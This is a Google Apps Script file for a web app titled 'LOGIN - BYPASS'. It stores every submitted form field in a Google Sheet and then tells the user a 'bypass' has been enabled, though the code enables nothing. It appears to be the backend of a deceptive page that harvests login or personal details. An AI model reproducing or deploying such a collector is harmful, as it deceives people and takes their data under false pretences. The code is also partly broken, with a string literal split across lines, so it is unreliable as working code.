const SPREADSHEET_ID = '1E-r_XKgeqFIWbVC_q8F_XohatrqP0HB7wdbTgbupntg';

// The main function that serves the web page
function doGet(e) {
  return HtmlService.createTemplateFromFile('index')
    .evaluate()
    // ===========================CHANGE TITLE NAME=======================================
    .setTitle('LOGIN - BYPASS')
    .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.DEFAULT);
}

function getFormHeaders() {
  try {
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    const headerSheet = ss.getSheetByName('header');
    if (!headerSheet) {
      throw new Error("Sheet 'header' not found. Please create it.");
    }
    const headers = headerSheet.getRange('A1:A').getValues()
      .flat() 
      .filter(String); 
    
    return headers;
  } catch (e) {
    Logger.log(e);
    return { error: e.message };
  }
}

function saveData(formData) {
  try {
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    const formSheet = ss.getSheetByName('form');
    if (!formSheet) {
      throw new Error("Sheet 'form' not found. Please create it.");
    }

    const headers = getFormHeaders();
    if (headers.error) { 
      throw new Error(headers.error);
    }
    
    if (formSheet.getLastRow() === 0) {
      const sheetHeaders = ['Timestamp', ...headers];
      formSheet.appendRow(sheetHeaders);
    }

    const timestamp = new Date();
    const newRow = [timestamp];
    
    headers.forEach(header => {
      newRow.push(formData[header] || ''); 
    });

    // Append the new row to the 'form' sheet
    formSheet.appendRow(newRow);

    return { 
      status: 'BYPASS OPEN', 
      message: 'BYPASS has been successfully enabled.
!' 
    };

  } catch (e) {
    Logger.log(e);
    return { 
      status: 'error', 
      message: 'An error occurred: ' + e.message 
    };
  }
}
